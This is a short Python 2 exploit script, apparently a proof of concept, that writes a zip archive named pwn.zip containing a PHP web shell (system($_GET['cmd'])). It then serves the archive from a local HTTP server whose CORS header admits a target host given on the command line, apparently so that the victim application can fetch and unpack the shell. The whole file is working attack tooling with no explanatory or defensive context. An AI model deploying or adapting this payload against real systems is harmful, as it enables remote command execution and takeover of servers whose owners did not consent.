#!/usr/bin/python

import sys
import zipfile
import BaseHTTPServer
from cStringIO import StringIO
from SimpleHTTPServer import SimpleHTTPRequestHandler

if len(sys.argv) < 3:
    print "Usage: %s <lport> <target>" % sys.argv[0]
    print "eg: %s 8000 172.16.69.128" % sys.argv[0]
    sys.exit(1)

def _build_zip():
    """
    builds the zip file
    """
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('pwn/si.php', "<?php system($_GET['cmd']); ?>")
    z.close()
    handle = open('pwn.zip','wb')
    handle.write(f.getvalue())
    handle.close

class CORSRequestHandler (SimpleHTTPRequestHandler):
    def end_headers (self):
        self.send_header('Access-Control-Allow-Origin', 'http://%s' % sys.argv[2])
        SimpleHTTPRequestHandler.end_headers(self)

if __name__ == '__main__':
    _build_zip()
    BaseHTTPServer.test(CORSRequestHandler, BaseHTTPServer.HTTPServer)
